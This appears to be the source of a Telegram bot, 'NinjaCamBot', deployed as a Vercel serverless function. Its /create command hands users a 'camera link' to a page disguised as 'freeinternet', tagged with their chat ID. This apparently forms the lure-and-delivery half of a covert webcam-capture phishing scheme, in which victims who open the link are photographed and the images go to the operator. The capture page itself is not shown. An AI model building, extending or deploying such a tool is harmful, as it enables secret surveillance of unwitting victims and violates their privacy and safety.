export default async function handler(req, res) {
  const BOT_TOKEN = process.env.BOT_TOKEN; // Set this in Vercel Environment Variables
  const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

  // Only accept POST requests
  if (req.method !== "POST") return res.status(200).send("OK");

  const update = req.body;
  const message = update?.message;
  const chat_id = message?.chat?.id;
  const text = message?.text;

  const sendMessage = async (chat_id, text, extra = {}) => {
    await fetch(`${TG_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id,
        text,
        parse_mode: "HTML",
        ...extra
      })
    });
  };

  if (!chat_id || !text) return res.status(200).end();

  // Start Command
  if (text === "/start") {
    await sendMessage(chat_id, 
`👋 Welcome to NinjaCamBot!

Click /create to generate your special camera link.

⚠️ Use responsibly!`);
    return res.status(200).end();
  }

  // Create Command
  if (text === "/create") {
    const baseUrl = "https://freeinternet-seven.vercel.app/";
    const link = `${baseUrl}/?chatid=${chat_id}`;

    await sendMessage(chat_id, 
`🎯 Your Ninja Camera Link is Ready

🔗 <code>${link}</code>

Open it in browser 🌐`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Open Link ✅", url: link }]
        ]
      }
    });

    return res.status(200).end();
  }

  return res.status(200).send("Done");
    }
